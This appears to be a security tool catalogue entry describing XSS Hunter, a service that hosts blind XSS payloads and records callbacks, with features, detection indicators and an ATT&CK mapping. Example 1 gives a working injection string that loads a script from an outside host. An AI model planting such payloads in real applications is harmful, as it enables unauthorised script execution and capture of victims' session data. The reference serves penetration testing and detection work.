---
id: tool-xss-hunter
url: 'https://xss.ht'
tags:
  - xss
  - detection
  - payload-hosting
type: tool
verified: false
platforms:
  - Web
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:30:58.375Z'
validated: true
submitted: true
---
# XSS Hunter

**Status**: Unverified

## Overview

XSS Hunter is a free service for hosting and tracking XSS payloads, primarily used in blind XSS scenarios to detect execution via callbacks without direct visibility.

## Description

It provides unique subdomains for payload hosting, capturing execution details like headers and location when scripts load. Ideal for pentesting apps with delayed or admin-only triggers, such as order systems. In this case, it hosted the payload for Zomato's Blind XSS, confirming admin dashboard execution.

## Features

- Feature 1: Unique subdomain generation for payload tracking
- Feature 2: Real-time callback notifications via dashboard or email
- Feature 3: Detailed hit logs including user-agent, IP, and referrer

## Installation

### Requirements

- Web browser for dashboard access
- Account registration on xss.ht

### Install Commands

No installation needed; it's a SaaS tool.

```bash
# Access via browser
curl -I https://xss.ht
```

## Basic Usage

```bash
# No CLI; use web interface to create hunts
```

### Common Options

| Option | Description |
|--------|-------------|
| Dashboard | Create and manage hunts |
| Payload Generator | Customize script templates |

## Examples

### Example 1: Basic Usage

Sign up at xss.ht, create a hunt, and get payload: `'><script src=https://yourhandle.xss.ht></script>`.

### Example 2: Advanced Usage

Embed in app input and monitor dashboard for hits with custom alerts.

## MITRE ATT&CK Mapping

This tool is commonly associated with:

### Techniques

- [[JavaScript]]

### Tactics

- [[Execution]]

## Detection

Indicators and methods for detecting this tool's usage:

- Outbound HTTPS requests to *.xss.ht domains
- Suspicious script src in network logs

## Related Procedures


## Related Tools

- [[Burp Suite]]
- [[BeEF Framework]]

## References

- Official documentation: https://xss.ht/docs
- Related resources: HackerOne reports on blind XSS
